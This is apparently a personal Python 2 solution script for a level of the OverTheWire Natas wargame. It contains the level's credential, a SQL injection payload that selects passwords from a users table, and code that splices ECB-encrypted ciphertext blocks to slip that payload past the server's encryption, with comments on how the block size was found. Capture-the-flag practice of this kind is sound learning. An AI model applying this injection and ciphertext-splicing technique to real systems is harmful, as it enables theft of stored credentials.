#!/usr/bin/env python
# SQL TIMED ATTACK
import requests
import re
from string import *
from time import *
import base64
import urllib

characters = lowercase + uppercase + digits	
	
username='natas28'
password='JWwR438wkgTsNKBbcJoowyysdM82YjeF'

url = 'http://%s.natas.labs.overthewire.org/' %username
path = "index-source.html"
session = requests.session()

block_size=16

# for i in range (8, 11):

# 	response = session.post(url, auth=(username, password), data={'query': "a"*i})
# 	print "For Query Length: ", i, "Data Length: ", len(base64.b64decode(urllib.unquote(response.url[60:])))

# 	for x in range (96/block_size):
# 		print "Block: ", x+1, "Data:", repr(base64.b64decode(urllib.unquote(response.url[60:]))[x*block_size:(x+1)*block_size])

injection = "a"*9 + "' union select password from users; #"

injection_block_size = (len(injection) -10) / block_size

if (injection_block_size % block_size != 0):
	injection_block_size += 1
print injection_block_size

response = session.post(url, auth=(username, password), data={'query': injection})
raw_injection = base64.b64decode(urllib.unquote(response.url[60:]))
# print repr(raw_injection)
print "="*80
response = session.post(url, auth=(username, password), data={'query': "a"*9})
good_base = base64.b64decode(urllib.unquote(response.url[60:]))
# print repr(good_base)

query = good_base[:block_size*3] + raw_injection[block_size*3:block_size*3+(injection_block_size*block_size)] + good_base[block_size*3:]

print urllib.quote(base64.b64encode(query)).replace("/", "%2F")
# path = 'search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oe%2BJ3Y2%2BwVxqbZmTo9x7ejCIaVF1T3rVZFTrXVtnaO5kY1sA1xi1%2BF7vPb%2FZHFEUMHc4pf%2B0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI%3D'
path = 'search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPKeYiaGpSZAWVcGCZq8sFK7%2BJ3Y2%2BwVxqbZmTo9x7ejCIaVF1T3rVZFTrXVtnaO5kY1sA1xi1%2BF7vPb%2FZHFEUMHoJUi8wHPnTascCPxZZSMWpc5zZBSL6eob5V3O1b5%2BMA%3D'

response = session.get(url + path, auth=(username, password))

content = response.text
# print repr(base64.b64decode(urllib.unquote(response.url[60:])))
# print "="*80
print content
# print session.cookies

# print  re.findall('Password: (.*)</pre>', content)[0]

# G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLof/YMma1yzL2UfjQXqQEop36O0aq+C10FxP/mrBQjq0eOsaH+JhosbBUGEQmz/to=
# G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKriAqPE2++uYlniRMkobB1vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
# G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIYiwNnSJY7KHJGU+XjuMzVvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
# G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKEMZKNASy09t5ooTNAbaX0vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=

# This level was kind of complex because there was as in the beginning there was no source code available like all the past levels, just one search box. And that returned some random joke related to comupter. But after testing, it came out that whaterver that was entered in the search box was searched through all the jokes and then all of them or a few that contained the searched character were returned.

# So, there must've been some query running and then looking at the url it gave a hint as it was an url encoded string because of the '%3D' at the end. Unquoting it back, returned a base64 string (from the '=' at the end of the string). But on decoding it didn't show some proper result. So, repr() helped to show the underlying data that was in unicode. 

# Looking at the data suggested that was encrypted suing ECB. So, running a loop by passing arguement with increasing length help to determine the block size of 16. 

# Then go watch john hammonds video on this.